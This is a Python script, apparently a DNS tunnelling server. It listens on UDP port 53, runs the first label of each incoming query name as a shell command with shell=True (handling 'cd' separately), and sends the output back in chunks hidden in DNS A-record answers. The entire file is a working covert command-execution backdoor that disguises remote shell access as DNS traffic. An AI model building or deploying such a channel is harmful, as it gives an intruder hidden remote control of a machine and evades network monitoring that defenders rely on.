#!/usr/bin/python3

import sys
import os
import socket
import subprocess
from message import *

serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if(len(sys.argv) == 2):
    serversocket.bind((sys.argv[1], 53))
else:
    print("Argument error, socket bind on 127.0.0.1")
    serversocket.bind(("127.0.0.1",53))

last = ""
res = b'\x01\x01\x01\x01'
req_left = 0
req = 0

while True:
    data, ad = serversocket.recvfrom(4096)
    print(data)
    q = bytesToMessage(data)

    print(q)
    
    cmd = q.qList[0].qname.split(".")
    print(cmd)

    if(cmd[0] != "devtoplay"):
        if(last != cmd[0] and req_left == 0):
            i = 0
            while(cmd[0][i] >= "0" and cmd[0][i] <= "9"):
                i += 1
            
            if("cd" in cmd[0][i:]):
                os.chdir(cmd[0][i+3:])
                res=b'\x00\x00\x00\x00'
            else:
                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                res,err = p.communicate()

                if(res is None or res == b''):
                    res = err

                if(res is None):
                    res = b''
                
                res = len(res).to_bytes(1,'big') + res
                sel = int(cmd[0][:i],10)
                a = [RR("",res[j:j+4], 1, 1, 1) for j in range(0,len(res),4)]
                req_left = len(a)
                l = len(a[req_left - 1].rdata)
                
                if(l != 4):
                    a[req_left - 1].rdata += b'\x00' * (4 - l)
                    
                a.append(RR("",b'\x00\x00\x00\x00', 1, 1, 1))
                req_left += 1
                req = 0

    if(req  < req_left):
        if(cmd[0] != last):
            answer = a[req]
            a[req].name = q.qList[0].qname
            req += 1
            if(req == req_left):
                req_left = 0
            
        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [answer])
        
    else:
        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [RR(q.qList[0].qname,res, 1, 1, 1)])
        
    last = cmd[0]


    print(message)
    print(message.getBytes())
    serversocket.sendto(message.getBytes(), ad)
    print("end")
        
        
